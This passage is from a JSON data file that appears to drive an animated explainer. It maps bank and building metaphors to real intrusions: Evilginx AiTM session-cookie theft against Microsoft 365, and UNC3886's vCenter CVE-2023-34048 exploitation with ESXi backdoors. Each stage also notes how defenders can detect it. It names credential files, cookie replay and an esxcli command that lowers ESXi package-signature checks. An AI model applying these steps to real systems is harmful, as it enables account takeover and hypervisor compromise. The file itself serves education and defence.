          "id": "VIEW_A",
          "label": "Clean Baseline",
          "position": [
            -6.4,
            4,
            8.6
          ],
          "target": [
            -4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Live Memory",
          "position": [
            6.4,
            4,
            8.6
          ],
          "target": [
            4.3,
            1.8,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "X-Ray Gantry",
          "position": [
            0,
            8.2,
            8.2
          ],
          "target": [
            0,
            2.1,
            -0.2
          ]
        }
      ]
    }
  },
  "unit42-star-blizzard-evilginx-aitm": {
    "briefing": {
      "scenarioId": "unit42-star-blizzard-evilginx-aitm",
      "sectionKey": "briefing",
      "sceneKind": "net-evilginx-aitm-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1539",
      "title": "Star Blizzard / Storm-0539: Evilginx AiTM Cookie Theft — Story-to-Technical Overview",
      "storyCue": "A fraudster sets up an identical glass booth directly in front of the real bank lobby. A customer steps into the glass booth, enters both their vault code and live one-time stamp while the fraudster relays everything to the real bank teller, and then the fraudster walks away with the stamped entry pass to open the customer mailroom unchecked.",
      "technicalCue": "CREDENTIAL ACCESS: EVILGINX AITM REVERSE-PROXY MFA INTERCEPTION -> LATERAL & C2: WEB SESSION COOKIE REPLAY (PASS-THE-COOKIE) -> DEFENSE EVASION: STEALTH INBOX RULE CREATION & BEC EXFILTRATION",
      "storyMappings": [
        {
          "storyTerm": "Identical glass booth",
          "technicalTerm": "Evilginx adversary-in-the-middle reverse proxy",
          "tone": "amber"
        },
        {
          "storyTerm": "Live one-time stamp",
          "technicalTerm": "Real-time multi-factor authentication challenge",
          "tone": "sky"
        },
        {
          "storyTerm": "Stamped entry pass",
          "technicalTerm": "Stolen ESTSAUTHPERSISTENT session cookie",
          "tone": "rose"
        },
        {
          "storyTerm": "Customer mailroom",
          "technicalTerm": "Cloud mailbox and inbox forwarding rules",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-evilginx-aitm-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Identical glass booth",
          "subtitle": "Evilginx adversary-in-the-middle reverse proxy",
          "tone": "amber"
        },
        {
          "id": "net-evilginx-aitm-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Live one-time stamp",
          "subtitle": "Real-time multi-factor authentication challenge",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Look-alike Word",
          "stageTag": "STAGE 01 · CREDENTIAL ACCESS",
          "title": "EVILGINX AITM REVERSE-PROXY MFA INTERCEPTION",
          "storyExcerpt": "A convincing invitation letter lures the employee to a look-alike glass booth built on a freshly rented storefront. Every word and visual logo inside the booth is mirrored live from the genuine bank…",
          "technicalParallel": "Unlike traditional phishing kits that host a static HTML copy of a login page (which breaks when MFA challenges or dynamic JavaScript run), an AiTM reverse proxy relays every HTTP request and response…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Live One-time",
          "stageTag": "STAGE 02 · LATERAL & C2",
          "title": "WEB SESSION COOKIE REPLAY (PASS-THE-COOKIE)",
          "storyExcerpt": "The employee types their secret passphrase and approves the live security chime on their pocket buzzer. The glass booth forwards both answers straight to the real teller and quietly photocopies the…",
          "technicalParallel": "Because the victim’s TLS session terminates on the attacker’s Evilginx server before Evilginx opens a second TLS session to Microsoft, Evilginx can read and save every HTTP header, including Set-Cookie…",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Pass",
          "stageTag": "STAGE 03 · DEFENSE EVASION",
          "title": "STEALTH INBOX RULE CREATION & BEC EXFILTRATION",
          "storyExcerpt": "From another city, the fraudster flashes the photocopied entry pass at the mailroom door, bypassing both the password desk and the pocket buzzer entirely. Inside, the fraudster adds a secret forwarding…",
          "technicalParallel": "Why did MFA fail to stop this? Because TOTP codes and push approvals only verify the login event, not the domain in the browser bar.",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mirror Booth",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Real Portal",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Live Relay",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "unit42-star-blizzard-evilginx-aitm",
      "sectionKey": "step-1",
      "sceneKind": "net-evilginx-aitm-step-1",
      "stageBadge": "STEP #1 · CREDENTIAL ACCESS",
      "title": "Victim Opens the Spear-Phishing Link & Evilginx Proxies the Real Microsoft Login Page Live",
      "storyCue": "A convincing invitation letter lures the employee to a look-alike glass booth built on a freshly rented storefront. Every word and visual logo inside the booth is mirrored live from the genuine bank lobby just behind the curtain.",
      "technicalCue": "T1539 · CREDENTIAL ACCESS — After building trust via email, the attacker sends a link to a lookalike domain (e.g., login.micros0ft-auth-portal.com, registered with a valid Let’s Encrypt HTTPS certificate so the browser…",
      "storyMappings": [
        {
          "storyTerm": "Convincing invitation letter",
          "technicalTerm": "Targeted spear-phishing email link",
          "tone": "amber"
        },
        {
          "storyTerm": "Look-alike glass booth",
          "technicalTerm": "Evilginx transparent reverse-proxy server",
          "tone": "sky"
        },
        {
          "storyTerm": "Genuine bank lobby",
          "technicalTerm": "Legitimate cloud identity login portal",
          "tone": "rose"
        },
        {
          "storyTerm": "Freshly rented storefront",
          "technicalTerm": "Attacker-registered phishing domain and TLS cert",
          "tone": "emerald"
        }
      ],
      "accentHex": "#38BDF8",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-evilginx-aitm-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Convincing invitation letter",
          "subtitle": "Targeted spear-phishing email link",
          "tone": "amber"
        },
        {
          "id": "net-evilginx-aitm-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Look-alike glass booth",
          "subtitle": "Evilginx transparent reverse-proxy server",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Look-alike",
          "stageTag": "STEP 01 · SETUP",
          "title": "Convincing invitation letter",
          "storyExcerpt": "A convincing invitation letter lures the employee to a look-alike glass booth built on a freshly rented storefront.",
          "technicalParallel": "Unlike traditional phishing kits that host a static HTML copy of a login page (which breaks when MFA challenges or dynamic JavaScript run), an AiTM reverse proxy relays every HTTP request and response…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Look-alike",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Look-alike glass booth",
          "storyExcerpt": "Every word and visual logo inside the booth is mirrored live from the genuine bank lobby just behind the curtain.",
          "technicalParallel": "After building trust via email, the attacker sends a link to a lookalike domain (e.g., login.micros0ft-auth-portal.com, registered with a valid Let’s Encrypt HTTPS certificate so the browser still…",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Bank",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Freshly rented storefront",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across freshly rented storefront while locking down genuine bank lobby.",
          "technicalParallel": "Documented by Microsoft Threat Intelligence (cloud identity telemetry linking phishing clicks to proxy sign-ins): Entra Sign-in Logs showing login initiation from an untrusted proxy IP/ASN shortly after…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mirror Booth",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Real Portal",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Live Relay",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1539"
    },
    "step-2": {
      "scenarioId": "unit42-star-blizzard-evilginx-aitm",
      "sectionKey": "step-2",
      "sceneKind": "net-evilginx-aitm-step-2",
      "stageBadge": "STEP #2 · LATERAL & C2",
      "title": "Relaying the Victim’s Password & Live MFA Code Through the Reverse Proxy",
      "storyCue": "The employee types their secret passphrase and approves the live security chime on their pocket buzzer. The glass booth forwards both answers straight to the real teller and quietly photocopies the stamped entry pass handed back through the slot.",
      "technicalCue": "T1550.004 · LATERAL & C2 — The victim enters their corporate password and completes their real MFA challenge (typing a 6-digit Authenticator code or tapping \"Approve\" on a push notification).",
      "storyMappings": [
        {
          "storyTerm": "Secret passphrase",
          "technicalTerm": "Captured user account password",
          "tone": "amber"
        },
        {
          "storyTerm": "Pocket buzzer approval",
          "technicalTerm": "Completed MFA push or TOTP verification",
          "tone": "sky"
        },
        {
          "storyTerm": "Photocopied entry pass",
          "technicalTerm": "Intercepted Set-Cookie session token",
          "tone": "rose"
        },
        {
          "storyTerm": "Booth handshake signature",
          "technicalTerm": "Reverse-proxy TLS JA3 client fingerprint",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#38BDF8",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-evilginx-aitm-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Secret passphrase",
          "subtitle": "Captured user account password",
          "tone": "amber"
        },
        {
          "id": "net-evilginx-aitm-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Pocket buzzer approval",
          "subtitle": "Completed MFA push or TOTP verification",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Live",
          "stageTag": "STEP 02 · SETUP",
          "title": "Secret passphrase",
          "storyExcerpt": "The employee types their secret passphrase and approves the live security chime on their pocket buzzer.",
          "technicalParallel": "Because the victim’s TLS session terminates on the attacker’s Evilginx server before Evilginx opens a second TLS session to Microsoft, Evilginx can read and save every HTTP header, including Set-Cookie…",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Both Real",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Pocket buzzer approval",
          "storyExcerpt": "The glass booth forwards both answers straight to the real teller and quietly photocopies the stamped entry pass handed back through the slot.",
          "technicalParallel": "The victim enters their corporate password and completes their real MFA challenge (typing a 6-digit Authenticator code or tapping \"Approve\" on a push notification).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Pass",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Booth handshake signature",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across booth handshake signature while locking down photocopied entry pass.",
          "technicalParallel": "Documented in MITRE T1539 and Microsoft Entra Identity Protection (risk analytics focused on session token theft): high-risk AiTM sign-in alert where the TLS fingerprint (JA3) and IP of the MFA step…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mirror Booth",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Real Portal",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Live Relay",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1550.004"
    },
    "step-3": {
      "scenarioId": "unit42-star-blizzard-evilginx-aitm",
      "sectionKey": "step-3",
      "sceneKind": "net-evilginx-aitm-step-3",
      "stageBadge": "STEP #3 · DEFENSE EVASION",
      "title": "Injecting the Stolen ESTSAUTHPERSISTENT Cookie to Access Email Without MFA",
      "storyCue": "From another city, the fraudster flashes the photocopied entry pass at the mailroom door, bypassing both the password desk and the pocket buzzer entirely. Inside, the fraudster adds a secret forwarding tray that diverts sensitive correspondence out of sight.",
      "technicalCue": "T1564.008 · DEFENSE EVASION — The attacker imports the stolen ESTSAUTHPERSISTENT cookie into their own browser using a cookie editor and opens outlook.office.com.",
      "storyMappings": [
        {
          "storyTerm": "Flashing the photocopied pass",
          "technicalTerm": "Replaying ESTSAUTHPERSISTENT session cookie",
          "tone": "amber"
        },
        {
          "storyTerm": "Second city entrance",
          "technicalTerm": "New attacker IP address reusing the same SessionId",
          "tone": "sky"
        },
        {
          "storyTerm": "Secret forwarding tray",
          "technicalTerm": "Malicious New-InboxRule mailbox rule",
          "tone": "rose"
        },
        {
          "storyTerm": "Mailroom ledger",
          "technicalTerm": "Cloud Unified Audit Log telemetry",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F43F5E",
      "secondaryHex": "#10B981",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-evilginx-aitm-step-3-left",
          "tag": "STEP 3 · FOCUS",
          "title": "Flashing the photocopied pass",
          "subtitle": "Replaying ESTSAUTHPERSISTENT session cookie",
          "tone": "amber"
        },
        {
          "id": "net-evilginx-aitm-step-3-right",
          "tag": "STEP 3 · ACTION",
          "title": "Second city entrance",
          "subtitle": "New attacker IP address reusing the same SessionId",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Pass",
          "stageTag": "STEP 03 · SETUP",
          "title": "Flashing the photocopied pass",
          "storyExcerpt": "From another city, the fraudster flashes the photocopied entry pass at the mailroom door, bypassing both the password desk and the pocket buzzer entirely.",
          "technicalParallel": "Why did MFA fail to stop this? Because TOTP codes and push approvals only verify the login event, not the domain in the browser bar.",
          "accentHex": "#38BDF8",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. City",
          "stageTag": "STEP 03 · MECHANISM",
          "title": "Second city entrance",
          "storyExcerpt": "Inside, the fraudster adds a secret forwarding tray that diverts sensitive correspondence out of sight.",
          "technicalParallel": "The attacker imports the stolen ESTSAUTHPERSISTENT cookie into their own browser using a cookie editor and opens outlook.office.com.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Tray",
          "stageTag": "STEP 03 · EVIDENCE",
          "title": "Forensic Detection",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across mailroom ledger while locking down secret forwarding tray.",
          "technicalParallel": "Documented in Microsoft Sentinel and Entra Sign-in Logs (post-compromise session correlation queries): identical UniqueTokenIdentifier / SessionId replayed from a second IP address followed by…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Mirror Booth",
          "position": [
            -6.3,
            4.2,
            8.4
          ],
          "target": [
            -4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Real Portal",
          "position": [
            4.3,
            4.2,
            8.4
          ],
          "target": [
            2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Live Relay",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1564.008"
    }
  },
  "vmware-vcenter-cve-2023-34048-unc3886": {
    "briefing": {
      "scenarioId": "vmware-vcenter-cve-2023-34048-unc3886",
      "sectionKey": "briefing",
      "sceneKind": "net-vcenter-unc3886-briefing",
      "stageBadge": "BRIEFING #0 · END-TO-END STORY DIORAMA",
      "mitreId": "T1190",
      "title": "UNC3886: vCenter vmdird Out-of-Bounds Write & ESXi VIRTUALPITA Backdoor — Story-to-Technical Overview",
      "storyCue": "A fleet headquarters keeps every branch-office locker key inside one central dispatch cabinet. An intruder slips a mismeasured parcel through the headquarters directory window to seize the central console, unlocks the key safe to read branch passwords, and installs a hidden intercom wire linking the basement floor directly to upper tenant suites.",
      "technicalCue": "INITIAL ACCESS: VCENTER VMDIRD DCERPC OUT-OF-BOUNDS WRITE (CVE-2023-34048) -> CREDENTIAL ACCESS: EXTRACTING & DECRYPTING ESXI \"VPXUSER\" CREDENTIALS FROM VCDB -> PERSISTENCE: DEPLOYING VIRTUALPITA & VIRTUALPIE VIB BACKDOORS OVER AF_VSOCK",
      "storyMappings": [
        {
          "storyTerm": "Fleet headquarters console",
          "technicalTerm": "Central VMware vCenter management server",
          "tone": "amber"
        },
        {
          "storyTerm": "Directory window memory fault",
          "technicalTerm": "vmdird DCERPC out-of-bounds write (CVE-2023-34048)",
          "tone": "sky"
        },
        {
          "storyTerm": "Central branch key safe",
          "technicalTerm": "Encrypted vpxuser credentials and symkey.dat file",
          "tone": "rose"
        },
        {
          "storyTerm": "Hidden basement intercom wire",
          "technicalTerm": "ESXi VIRTUALPITA listener over AF_VSOCK sockets",
          "tone": "emerald"
        }
      ],
      "accentHex": "#06B6D4",
      "secondaryHex": "#F43F5E",
      "durationSec": 18,
      "callouts": [
        {
          "id": "net-vcenter-unc3886-b-left",
          "tag": "ENTRY & STORY WORLD",
          "title": "Fleet headquarters console",
          "subtitle": "Central VMware vCenter management server",
          "tone": "amber"
        },
        {
          "id": "net-vcenter-unc3886-b-right",
          "tag": "TARGET MECHANISM",
          "title": "Directory window memory fault",
          "subtitle": "vmdird DCERPC out-of-bounds write (CVE-2023-34048)",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Card Past",
          "stageTag": "STAGE 01 · INITIAL ACCESS",
          "title": "VCENTER VMDIRD DCERPC OUT-OF-BOUNDS WRITE (CVE-2023-34048)",
          "storyExcerpt": "An outsider sends an oversized directory filing card through the headquarters service window. The filing clerk writes past the edge of the tray into adjacent control dials, handing over supervisor…",
          "technicalParallel": "Even if the attacker deletes the /var/core/core.vmdird.* file from disk, /var/log/vmware/vmdird/ and systemd journal logs still record the unexpected vmdird service exit/restart timestamp.",
          "accentHex": "#06B6D4",
          "startSec": 0,
          "endSec": 6
        },
        {
          "id": 2,
          "shortLabel": "2. Sign-ins Each",
          "stageTag": "STAGE 02 · CREDENTIAL ACCESS",
          "title": "EXTRACTING & DECRYPTING ESXI \"VPXUSER\" CREDENTIALS FROM VCDB",
          "storyExcerpt": "Once inside the headquarters vault, the intruder retrieves the master codebook and unlocks every stored branch-office combination, allowing quiet sign-ins to each remote building floor.",
          "technicalParallel": "Compromising a single vCenter Server hands the attacker root-equivalent credentials (vpxuser) to every underlying ESXi hypervisor managed by that vCenter instance.",
          "accentHex": "#22D3EE",
          "startSec": 6,
          "endSec": 12
        },
        {
          "id": 3,
          "shortLabel": "3. Key Safe",
          "stageTag": "STAGE 03 · PERSISTENCE",
          "title": "DEPLOYING VIRTUALPITA & VIRTUALPIE VIB BACKDOORS OVER AF_VSOCK",
          "storyExcerpt": "On the hypervisor floor, the intruder lowers the building inspection standard, installs an unsigned maintenance module, and wires a private basement speaking tube that bypasses hallway guards to reach…",
          "technicalParallel": "By chaining AF_VSOCK with CVE-2023-20867 (a VMware Tools authentication bypass in vmtoolsd), UNC3886 can push commands and transfer files from the ESXi hypervisor straight into any guest Virtual Machine…",
          "accentHex": "#F43F5E",
          "startSec": 12,
          "endSec": 18
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fleet Console",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Directory Seal",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Heap Fault",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ]
    },
    "step-1": {
      "scenarioId": "vmware-vcenter-cve-2023-34048-unc3886",
      "sectionKey": "step-1",
      "sceneKind": "net-vcenter-unc3886-step-1",
      "stageBadge": "STEP #1 · INITIAL ACCESS",
      "title": "Exploiting vmdird DCERPC Out-of-Bounds Write on vCenter Server (CVE-2023-34048)",
      "storyCue": "An outsider sends an oversized directory filing card through the headquarters service window. The filing clerk writes past the edge of the tray into adjacent control dials, handing over supervisor control of the central management hub.",
      "technicalCue": "T1190 · INITIAL ACCESS — UNC3886 sends crafted DCERPC packets over TCP port 2012 to the VMware Directory Service daemon (/usr/lib/vmware-vmdir/sbin/vmdird) on the vCenter Server Appliance (VCSA).",
      "storyMappings": [
        {
          "storyTerm": "Headquarters directory clerk",
          "technicalTerm": "vmdird directory service process",
          "tone": "amber"
        },
        {
          "storyTerm": "Oversized filing card",
          "technicalTerm": "Malformed DCERPC request triggering CVE-2023-34048",
          "tone": "sky"
        },
        {
          "storyTerm": "Writing past the tray edge",
          "technicalTerm": "Out-of-bounds heap write in vmdird",
          "tone": "rose"
        },
        {
          "storyTerm": "Central management hub",
          "technicalTerm": "Compromised vCenter Server appliance",
          "tone": "emerald"
        }
      ],
      "accentHex": "#06B6D4",
      "secondaryHex": "#06B6D4",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-vcenter-unc3886-step-1-left",
          "tag": "STEP 1 · FOCUS",
          "title": "Headquarters directory clerk",
          "subtitle": "vmdird directory service process",
          "tone": "amber"
        },
        {
          "id": "net-vcenter-unc3886-step-1-right",
          "tag": "STEP 1 · ACTION",
          "title": "Oversized filing card",
          "subtitle": "Malformed DCERPC request triggering CVE-2023-34048",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Card",
          "stageTag": "STEP 01 · SETUP",
          "title": "Headquarters directory clerk",
          "storyExcerpt": "An outsider sends an oversized directory filing card through the headquarters service window.",
          "technicalParallel": "Even if the attacker deletes the /var/core/core.vmdird.* file from disk, /var/log/vmware/vmdird/ and systemd journal logs still record the unexpected vmdird service exit/restart timestamp.",
          "accentHex": "#06B6D4",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Card",
          "stageTag": "STEP 01 · MECHANISM",
          "title": "Oversized filing card",
          "storyExcerpt": "The filing clerk writes past the edge of the tray into adjacent control dials, handing over supervisor control of the central management hub.",
          "technicalParallel": "UNC3886 sends crafted DCERPC packets over TCP port 2012 to the VMware Directory Service daemon (/usr/lib/vmware-vmdir/sbin/vmdird) on the vCenter Server Appliance (VCSA).",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Past Tray",
          "stageTag": "STEP 01 · EVIDENCE",
          "title": "Central management hub",
          "storyExcerpt": "Watchful investigators trace the unusual trail left across central management hub while locking down writing past the tray edge.",
          "technicalParallel": "Documented by Mandiant and VMware VMSA-2023-0023 (vendor and incident-response telemetry for vCenter exploitation): vmdird service crash or restart events occurring within minutes of unexpected…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fleet Console",
          "position": [
            -4.3,
            4.2,
            8.4
          ],
          "target": [
            -2.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Directory Seal",
          "position": [
            6.3,
            4.2,
            8.4
          ],
          "target": [
            4.8,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Heap Fault",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1190"
    },
    "step-2": {
      "scenarioId": "vmware-vcenter-cve-2023-34048-unc3886",
      "sectionKey": "step-2",
      "sceneKind": "net-vcenter-unc3886-step-2",
      "stageBadge": "STEP #2 · CREDENTIAL ACCESS",
      "title": "Decrypting ESXi vpxuser Passwords Using VPX_HOST & /etc/vmware-vpx/ssl/symkey.dat",
      "storyCue": "Once inside the headquarters vault, the intruder retrieves the master codebook and unlocks every stored branch-office combination, allowing quiet sign-ins to each remote building floor.",
      "technicalCue": "T1552.001 · CREDENTIAL ACCESS — To manage all ESXi hypervisors in the cluster, vCenter automatically creates and maintains a privileged root-equivalent account named vpxuser on every ESXi host.",
      "storyMappings": [
        {
          "storyTerm": "Master vault codebook",
          "technicalTerm": "/etc/vmware-vpx/ssl/symkey.dat decryption key",
          "tone": "amber"
        },
        {
          "storyTerm": "Branch-office combinations",
          "technicalTerm": "Decrypted ESXi vpxuser host credentials",
          "tone": "sky"
        },
        {
          "storyTerm": "Remote building floors",
          "technicalTerm": "Managed ESXi hypervisor hosts",
          "tone": "rose"
        },
        {
          "storyTerm": "Vault access ledger",
          "technicalTerm": "Auditd file-read records and ESXi SSH sign-in logs",
          "tone": "emerald"
        }
      ],
      "accentHex": "#F59E0B",
      "secondaryHex": "#06B6D4",
      "durationSec": 15,
      "callouts": [
        {
          "id": "net-vcenter-unc3886-step-2-left",
          "tag": "STEP 2 · FOCUS",
          "title": "Master vault codebook",
          "subtitle": "/etc/vmware-vpx/ssl/symkey.dat decryption key",
          "tone": "amber"
        },
        {
          "id": "net-vcenter-unc3886-step-2-right",
          "tag": "STEP 2 · ACTION",
          "title": "Branch-office combinations",
          "subtitle": "Decrypted ESXi vpxuser host credentials",
          "tone": "sky"
        }
      ],
      "phases": [
        {
          "id": 1,
          "shortLabel": "1. Sign-ins Each",
          "stageTag": "STEP 02 · SETUP",
          "title": "Master vault codebook",
          "storyExcerpt": "Once inside the headquarters vault, the intruder retrieves the master codebook and unlocks every stored branch-office combination, allowing quiet sign-ins to each remote building floor.",
          "technicalParallel": "Compromising a single vCenter Server hands the attacker root-equivalent credentials (vpxuser) to every underlying ESXi hypervisor managed by that vCenter instance.",
          "accentHex": "#06B6D4",
          "startSec": 0,
          "endSec": 5
        },
        {
          "id": 2,
          "shortLabel": "2. Uses",
          "stageTag": "STEP 02 · MECHANISM",
          "title": "Branch-office combinations",
          "storyExcerpt": "Inside the facility, the hidden mechanism uses branch-office combinations to advance toward remote building floors.",
          "technicalParallel": "To manage all ESXi hypervisors in the cluster, vCenter automatically creates and maintains a privileged root-equivalent account named vpxuser on every ESXi host.",
          "accentHex": "#F59E0B",
          "startSec": 5,
          "endSec": 10.2
        },
        {
          "id": 3,
          "shortLabel": "3. Sign-ins Each",
          "stageTag": "STEP 02 · EVIDENCE",
          "title": "Vault access ledger",
          "storyExcerpt": "Behind the scenes, vault access ledger captures the unmistakable footprint of the intrusion.",
          "technicalParallel": "Documented by Mandiant (forensic traces of credential harvesting across virtualization tiers): Auditd and shell history entries showing reads of /etc/vmware-vpx/ssl/symkey.dat paired with anomalous…",
          "accentHex": "#10B981",
          "startSec": 10.2,
          "endSec": 15
        }
      ],
      "cameraPresets": [
        {
          "id": "DIRECTOR",
          "label": "Director",
          "position": [
            0.2,
            5.6,
            15.8
          ],
          "target": [
            0,
            1.9,
            0
          ]
        },
        {
          "id": "VIEW_A",
          "label": "Fleet Console",
          "position": [
            -5.6,
            4.2,
            8.4
          ],
          "target": [
            -4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_B",
          "label": "Directory Seal",
          "position": [
            5.6,
            4.2,
            8.4
          ],
          "target": [
            4.1,
            1.9,
            -0.3
          ]
        },
        {
          "id": "VIEW_C",
          "label": "Heap Fault",
          "position": [
            0.3,
            6.6,
            9.2
          ],
          "target": [
            0,
            2.2,
            0
          ]
        }
      ],
      "mitreId": "T1552.001"
    },
    "step-3": {
      "scenarioId": "vmware-vcenter-cve-2023-34048-unc3886",
      "sectionKey": "step-3",
      "sceneKind": "net-vcenter-unc3886-step-3",
      "stageBadge": "STEP #3 · PERSISTENCE",
      "title": "Installing VIRTUALPITA on ESXi & Pivoting via AF_VSOCK Hypervisor Sockets",
      "storyCue": "On the hypervisor floor, the intruder lowers the building inspection standard, installs an unsigned maintenance module, and wires a private basement speaking tube that bypasses hallway guards to reach upper tenant rooms.",
      "technicalCue": "T1547 · PERSISTENCE — Using the decrypted vpxuser credentials, UNC3886 logs into the ESXi hypervisor, lowers its package signature requirement (esxcli software acceptance set --level=CommunitySupported), and…",
      "storyMappings": [
        {
          "storyTerm": "Lowered inspection standard",
          "technicalTerm": "ESXi AcceptanceLevel reduced to CommunitySupported",
          "tone": "amber"
        },
        {
          "storyTerm": "Unsigned maintenance module",
          "technicalTerm": "Rogue VIB package deploying VIRTUALPITA",
